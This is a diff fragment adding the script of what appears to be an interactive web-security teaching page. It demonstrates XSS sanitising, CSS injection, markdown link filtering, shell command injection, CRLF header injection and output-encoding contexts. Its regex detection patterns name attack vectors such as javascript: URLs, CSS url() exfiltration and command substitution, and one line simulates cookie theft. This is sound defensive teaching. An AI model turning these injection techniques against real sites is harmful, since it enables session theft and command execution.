+        for (const a of allowed[n.tagName]) { const v = n.getAttribute(a); if (v && /^https?:\/\//i.test(v.trim())) { e.setAttribute(a, v.trim()); e.setAttribute("rel", "nofollow noopener"); } }
+        walk(n, e); dst.appendChild(e);
+      } else walk(n, dst);
+    }
+  })(doc.body, out);
+  return out;
+}
+function xs() {
+  const v = $("#xs-in").value, { doc, found } = analyze(v), httpOnly = $("#xs-httponly").checked;
+  const stealsCookie = found.some(f => /cookie/.test(f));
+  $("#xs-raw").innerHTML = found.length ? found.map(f => '<span class="r">✗ ' + f + "</span>").join("\n") + (stealsCookie ? (httpOnly ? '\n<span class="y">document.cookie returns "" for the session (HttpOnly), but the script still runs and can call your APIs as the user</span>' : '\n<span class="r">document.cookie → "sid=8c1f7e2a9b; theme=dark" sent to attacker</span>') : "") : '<span class="g">nothing executable found</span>';
+  $("#xs-esc").innerHTML = '<span class="w">' + esc(esc(v)) + '</span>\n<span class="g">displayed literally as text</span>';
+  const clean = sanitize(doc);
+  $("#xs-san").textContent = clean.innerHTML || "(empty)";
+  $("#xs-render").replaceChildren(...clean.childNodes);
+}
+$("#xs-in").addEventListener("input", xs); $("#xs-httponly").addEventListener("change", xs);
+$$("[data-xs]").forEach(b => b.onclick = () => { $("#xs-in").value = b.dataset.xs; xs(); }); xs();
+
+// 7.4 CSS
+function cssA() {
+  const v = $("#css-raw").value, issues = [];
+  if (/url\s*\(/i.test(v)) issues.push("url(…) to an external host → can leak data with attribute selectors");
+  if (/\[[^\]]*value/i.test(v)) issues.push("attribute selector on value → reads form fields one character at a time");
+  if (/display\s*:\s*none/i.test(v)) issues.push("hides real UI elements");
+  if (/position\s*:\s*fixed/i.test(v) || /::?(before|after)/.test(v)) issues.push("overlays fake content on top of the page");
+  if (/expression\s*\(|javascript:|-moz-binding|behavior\s*:/i.test(v)) issues.push("legacy script-in-CSS vector");
+  $("#css-raw-out").innerHTML = issues.length ? issues.map(i => '<span class="r">✗ ' + i + "</span>").join("\n") : '<span class="d">nothing obvious, but raw CSS can never be fully trusted</span>';
+}
+function cssG() {
+  const ok = s => /^#[0-9a-f]{3}([0-9a-f]{3})?$/i.test(s.trim());
+  const bg = $("#css-bg").value, fg = $("#css-fg").value;
+  const lines = [[bg, "background"], [fg, "color"]].map(([v, prop]) => ok(v) ? `<span class="g">  ${prop}: ${esc(v.trim())};</span>` : `<span class="y">  /* ${prop} rejected: "${esc(v)}" is not #rgb or #rrggbb */</span>`);
+  $("#css-gen-out").innerHTML = `.profile {\n${lines.join("\n")}\n}`;
+}
+$("#css-raw").addEventListener("input", cssA); ["#css-bg", "#css-fg"].forEach(s => $(s).addEventListener("input", cssG)); cssA(); cssG();
+
+// 7.5 Markdown
+function md() {
+  let v = $("#md-in").value;
+  if ($("#md-nohtml").checked) v = esc(v);
+  let html = v.replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>").replace(/\[([^\]]+)\]\(([^)\s]+(?:\([^)]*\))?[^)\s]*)\)/g, (m, t, u) => `<a href="${u.replace(/"/g, "&quot;")}">${t}</a>`);
+  const { doc, found } = analyze(html);
+  if ($("#md-san").checked) html = sanitize(doc).innerHTML;
+  const after = analyze(html).found;
+  $("#md-out").textContent = html;
+  $("#md-verdict").innerHTML = after.length ? after.map(f => '<span class="r">✗ ' + f + "</span>").join("\n") + ($("#md-nohtml").checked && !$("#md-san").checked ? '\n<span class="y">disabling raw HTML didn\'t stop the javascript: link</span>' : "") : '<span class="g">safe output</span>';
+}
+$("#md-in").addEventListener("input", md); ["#md-nohtml", "#md-san"].forEach(s => $(s).addEventListener("change", md)); md();
+
+// 7.7 command injection
+function shellSplit(cmd) {
+  const cmds = []; let cur = "", subs = [];
+  const re = /\$\(([^)]*)\)|`([^`]*)`/g; let m; while ((m = re.exec(cmd))) subs.push(m[1] || m[2]);
+  cmd.split(/;|&&|\|\||\|/).forEach(p => { if (p.trim()) cmds.push(p.trim()); });
+  return { cmds, subs };
+}
+function cm() {
+  const v = $("#cm-in").value, full = `convert ${v} -resize 200 thumb.png`, { cmds, subs } = shellSplit(full);
+  let a = `/bin/sh -c "${esc(full)}"\n\nshell runs:\n` + cmds.map((c, i) => `${i === 0 ? "  " : '<span class="r">+ '}${esc(c)}${i === 0 ? "" : "</span>"}`).join("\n");
+  if (subs.length) a += "\n" + subs.map(s => `<span class="r">+ $(${esc(s)}) runs first; its output becomes part of the filename</span>`).join("\n");
+  if (/^-/.test(v.trim())) a += `\n<span class="y">"${esc(v)}" is read as an option, not a file</span>`;
+  $("#cm-a").innerHTML = a;
+  $("#cm-b").innerHTML = `argv = [\n  "convert",\n  "--",\n  <span class="g">${esc(JSON.stringify(v))}</span>,\n  "-resize", "200", "thumb.png"\n]\n<span class="g">one program, one literal filename argument${/^-/.test(v.trim()) ? '; "--" stops option parsing' : ""}</span>`;
+}
+$("#cm-in").addEventListener("input", cm); $$("[data-cm]").forEach(b => b.onclick = () => { $("#cm-in").value = b.dataset.cm; cm(); }); cm();
+
+// 7.8 header injection
+function hd() {
+  const raw = $("#hd-in").value, v = raw.replace(/\\r/g, "\r").replace(/\\n/g, "\n"), fix = $("#hd-fix").checked;
+  if (fix && /[\r\n]/.test(v)) { $("#hd-out").innerHTML = '<span class="g">500 / error: invalid character in header value "Location". Request rejected before anything is sent.</span>'; return; }
+  const resp = `HTTP/1.1 302 Found\r\nLocation: ${v}\r\nContent-Type: text/html\r\n\r\n<a href="/home">Moved</a>`;
+  const [head, ...bodyParts] = resp.split("\r\n\r\n");
+  const lines = head.split(/\r\n|\n|\r/);
+  const disp = lines.map((l, i) => { const injected = !/^(HTTP\/1\.1|Location|Content-Type)/.test(l) || (i > 1 && l.startsWith("Location")); return injected ? `<span class="r">${esc(l)}   ← injected header</span>` : esc(l); }).join("\n");
+  const body = bodyParts.join("\r\n\r\n");
+  const injectedBody = bodyParts.length > 1;
+  $("#hd-out").innerHTML = disp + "\n\n" + (injectedBody ? `<span class="r">${esc(bodyParts[0])}   ← attacker-controlled body</span>\n<span class="d">${esc(bodyParts.slice(1).join(""))}   (original body pushed out)</span>` : esc(body));
+}
+$("#hd-in").addEventListener("input", hd); $("#hd-fix").addEventListener("change", hd);
+$$("[data-hd]").forEach(b => b.onclick = () => { $("#hd-in").value = b.dataset.hd; hd(); }); hd();
+
+// 7.3 contexts
+function cx() {
+  const v = $("#cx-in").value, e = esc(v);
+  const rows = [
+    ["HTML body", "&lt;p&gt;&lt;%= v %&gt;&lt;/p&gt;", `&lt;p&gt;${esc(e)}&lt;/p&gt;`, '<span class="pill safe">safe</span> escaped text'],
+    ["quoted attribute", "&lt;div title=\"&lt;%= v %&gt;\"&gt;", `&lt;div title="${esc(e)}"&gt;`, '<span class="pill safe">safe</span> quote is encoded'],
+    ["unquoted attribute", "&lt;div title=&lt;%= v %&gt;&gt;", `&lt;div title=${esc(e)}&gt;`, /\s/.test(v) ? '<span class="pill bad">breaks out</span> a space starts a new attribute' : '<span class="pill meh">fragile</span> always quote attributes'],
+    ["inside &lt;script&gt;", "&lt;script&gt;n = \"&lt;%= v %&gt;\"&lt;/script&gt;", `&lt;script&gt;n = "${esc(e)}"&lt;/script&gt;`, /<\/script/i.test(v) ? '<span class="pill bad">dangerous</span> output without escaping, &lt;/script&gt; ends the block early and the rest runs as new HTML' : '<span class="pill meh">avoid</span> JS context needs JS encoding, not HTML'],
+    ["href attribute", "&lt;a href=\"&lt;%= v %&gt;\"&gt;", `&lt;a href="${esc(e)}"&gt;`, /^\s*javascript:/i.test(v) ? '<span class="pill bad">runs on click</span> escaping doesn\'t stop javascript: URLs' : '<span class="pill meh">validate</span> allow only http(s) URLs'],
+    ["CSS value", "style=\"color: &lt;%= v %&gt;\"", `style="color: ${esc(e)}"`, /[;:(]/.test(v) ? '<span class="pill bad">injects CSS</span> new properties / url() exfiltration' : '<span class="pill meh">allowlist</span> CSS needs an allowlist']];
+  $("#cx-out").innerHTML = rows.map(r => `<tr><td>${r[0]}</td><td><code>${r[1]}</code></td><td><code>${r[2]}</code></td><td>${r[3]}</td></tr>`).join("");
+}
+$("#cx-in").addEventListener("input", cx); $$("[data-cx]").forEach(b => b.onclick = () => { $("#cx-in").value = b.dataset.cx; cx(); }); cx();
+// DOM XSS
+function dom() {
+  const v = $("#dom-in").value, { found } = analyze("Hi " + v);
+  $("#dom-a").innerHTML = found.length ? found.map(f => '<span class="r">✗ ' + f + "</span>").join("\n") + '\n<span class="d">(server never saw this: fragments aren\'t sent)</span>' : '<span class="g">nothing executable</span>';
+  $("#dom-b").innerHTML = '<span class="g">' + esc("Hi " + v) + "</span>\nshown literally";
+}
+$("#dom-in").addEventListener("input", dom); dom();
+
+</script>
+</body>
+</html>
